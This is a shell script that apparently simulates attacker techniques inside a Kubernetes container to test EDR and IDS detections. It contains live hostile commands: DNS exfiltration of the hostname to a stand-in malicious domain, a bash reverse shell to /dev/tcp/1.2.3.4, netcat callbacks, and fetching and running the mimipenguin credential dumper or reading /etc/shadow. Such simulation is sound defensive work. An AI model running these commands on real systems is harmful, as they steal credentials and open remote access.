#!/usr/bin/env sh
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
BLUE="\033[1;34m"
RESET="\033[0m"

echo -e "${BLUE}[INFO] Starting simulated TTP execution in a Kubernetes container environment...${RESET}"

#######################################
# 1. Defense Evasion via Masquerading
# Creates a copy of /usr/bin/whoami to whoami.rtf and executes it.
#######################################
echo -e "${GREEN}[+][Defense Evasion] Masquerading: Copying whoami to whoami.rtf and executing...${RESET}"
cp /usr/bin/whoami /tmp/whoami.rtf
chmod +x /tmp/whoami.rtf
/tmp/whoami.rtf || echo -e "${YELLOW}[~] whoami.rtf execution failed${RESET}"

#######################################
# 2. Defense Evasion via Rootkit
# Changes the group owner of /etc/ld.so.preload to group 0, indicative of Jynx Rootkit activity.
#######################################
if [ -f /etc/ld.so.preload ]; then
  echo -e "${GREEN}[+][Defense Evasion] Changing group owner of /etc/ld.so.preload to 0...${RESET}"
  chgrp 0 /etc/ld.so.preload || echo -e "${YELLOW}[~] Could not change group - might require root${RESET}"
else
  echo -e "${YELLOW}[~] /etc/ld.so.preload does not exist, skipping rootkit simulation...${RESET}"
fi

#######################################
# 3. Execution via Command-Line Interface
# Emulate malicious CLI command: sh -c "whoami '[S];pwd;echo [E]'"
#######################################
echo -e "${GREEN}[+][Execution] Running suspicious CLI command...${RESET}"
sh -c "whoami '[S];pwd;echo [E]'" || echo -e "${YELLOW}[~] CLI command failed${RESET}"

#######################################
# 4. Exfiltration Over Alternative Protocol
# Attempts DNS exfil using 'dig' requests that contain system data as hostnames.
#######################################
if command -v dig >/dev/null; then
  echo -e "${GREEN}[+][Exfiltration] Attempting DNS-based data exfil...${RESET}"
  HOSTNAME_INFO=$(hostname)
  dig @8.8.8.8 ${HOSTNAME_INFO}.malicious.example.com || echo -e "${YELLOW}[~] DNS exfil attempt failed${RESET}"
else
  echo -e "${YELLOW}[~] dig not found, skipping DNS exfil simulation${RESET}"
fi

#######################################
# 5. Command & Control via Remote Access Protocol (*)
# Attempts to connect to a remote IP and exit at fork. Using netcat as a placeholder.
#######################################
if command -v nc >/dev/null; then
  echo -e "${GREEN}[+][C2] Attempting remote access connection to a remote IP (1.2.3.4:8080)...${RESET}"
  (echo "Hello" | nc 1.2.3.4 8080) || echo -e "${YELLOW}[~] Unable to connect to remote IP${RESET}"
else
  echo -e "${YELLOW}[~] nc not found, skipping remote C2 attempt${RESET}"
fi

#######################################
# 6. Collection via Automated Collection
# Dump /etc/passwd to /tmp/passwords as automated collection.
#######################################
echo -e "${GREEN}[+][Collection] Dumping /etc/passwd to /tmp/passwords...${RESET}"
cat /etc/passwd > /tmp/passwords || echo -e "${YELLOW}[~] Failed to dump passwords${RESET}"

#######################################
# 7. Credential Access via Credential Dumping (mimipenguin)
# Attempts to run mimipenguin to dump creds. If not available, just simulate.
#######################################
if [ ! -f /usr/local/bin/mimipenguin ]; then
  echo -e "${YELLOW}[~] mimipenguin not found, attempting to fetch it...${RESET}"
  # Attempt to clone mimipenguin (this might fail if not allowed)
  apk add --no-cache git || true
  git clone https://github.com/huntergregal/mimipenguin.git /tmp/mimipenguin || echo -e "${RED}[!] Failed to clone mimipenguin${RESET}"
  cp /tmp/mimipenguin/mimipenguin.py /usr/local/bin/mimipenguin 2>/dev/null || true
fi

if [ -f /usr/local/bin/mimipenguin ]; then
  echo -e "${GREEN}[+][Credential Access] Running mimipenguin to attempt credential dumping...${RESET}"
  python3 /usr/local/bin/mimipenguin || echo -e "${YELLOW}[~] mimipenguin execution failed${RESET}"
else
  echo -e "${YELLOW}[~] Unable to run mimipenguin, simulating credential dumping by cat'ing /etc/shadow${RESET}"
  cat /etc/shadow || true
fi

#######################################
# 8. Webserver Suspicious Terminal Spawn
# Emulate command injection: write a file to local webserver and execute it.
#######################################
# Simulate by creating a file that could be served by a local webserver
echo -e "${GREEN}[+][Webserver Suspicious Terminal] Simulating command injection...${RESET}"
echo "#!/bin/sh\necho 'Suspicious script executed'" > /tmp/web_payload.sh
chmod +x /tmp/web_payload.sh
# In a real scenario, you'd curl/wget a URL that triggers the webserver to run this script.
# We'll just execute it locally to simulate the effect:
sh /tmp/web_payload.sh || echo -e "${YELLOW}[~] Web payload execution failed${RESET}"

#######################################
# 9. Webserver Unexpected Child of Web Service
# Command injection to dump MySQL Server tables.
#######################################
# Assuming mysql client is installed and a local mysql server is running.
# Replace 'root:password@tcp(localhost:3306)/dbname' with actual credentials if available.
if command -v mysql >/dev/null; then
  echo -e "${GREEN}[+][Webserver Unexpected Child] Attempting to dump MySQL tables...${RESET}"
  mysql -h127.0.0.1 -uroot -pPASSWORD -e 'show databases;' || echo -e "${YELLOW}[~] Failed to list MySQL databases${RESET}"
else
  echo -e "${YELLOW}[~] mysql client not found, skipping MySQL dump simulation${RESET}"
fi

#######################################
# 10. Webserver Bash Reverse Shell *
# Command injection that creates a reverse shell.
#######################################
echo -e "${GREEN}[+][Webserver Reverse Shell] Simulating reverse shell via bash...${RESET}"
# Just simulate by running a bash reverse shell command (not actually connecting anywhere):
bash -c "bash -i >& /dev/tcp/1.2.3.4/9999 0>&1" || echo -e "${YELLOW}[~] Reverse shell simulation failed${RESET}"

#######################################
# 11. Webserver Trigger Metasploit Payload **
# Simulates malicious file upload that executes a reverse TCP meterpreter.
#######################################
# We'll simulate by creating a fake payload file and "downloading" it.
echo -e "${GREEN}[+][Webserver Metasploit Payload] Simulating a meterpreter download and execution...${RESET}"
echo "METASPLOIT_PAYLOAD" > /tmp/meterpreter_payload.bin
chmod +x /tmp/meterpreter_payload.bin
# In real scenario, would be triggered by web upload or curl from remote attacker.
# We'll just "exec" it here:
./tmp/meterpreter_payload.bin || echo -e "${YELLOW}[~] Meterpreter payload simulation failed${RESET}"

#######################################
# 12. Reverse TCP Trojan (inert) *
# Attempts to connect to 192.168.0.1:4444. Detected and killed by EDR if present.
#######################################
if command -v nc >/dev/null; then
  echo -e "${GREEN}[+][Reverse TCP Trojan] Attempting to connect to 192.168.0.1:4444...${RESET}"
  # Just simulate attempt:
  echo "GET /" | nc 192.168.0.1 4444 || echo -e "${YELLOW}[~] Connection refused or no route${RESET}"
else
  echo -e "${YELLOW}[~] nc not found, skipping reverse TCP Trojan simulation${RESET}"
fi

#######################################
echo -e "${BLUE}[INFO] All simulations attempted. Check your EDR/XDR/IDS logs for detections.${RESET}"